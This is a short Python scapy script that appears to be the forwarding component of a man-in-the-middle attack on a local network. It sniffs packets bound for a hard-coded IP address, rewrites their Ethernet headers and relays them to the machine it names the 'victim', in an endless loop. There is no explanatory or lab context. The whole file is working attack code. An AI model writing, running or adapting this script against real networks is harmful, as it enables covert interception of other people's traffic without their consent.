#!/usr/bin/python3

from scapy.all import *

def sendtovictim(packet):
	global targetmac
	packet[Ether].src = Ether().src
	packet[Ether].dst = targetmac
	sendp(packet)
	
targetip = "192.168.6.11"
targetmac = getmacbyip(targetip)
while True:
	try:
		sniff(filter= "ip dst host " + targetip, count = 1, prn=sendtovictim)
	except:
		continue

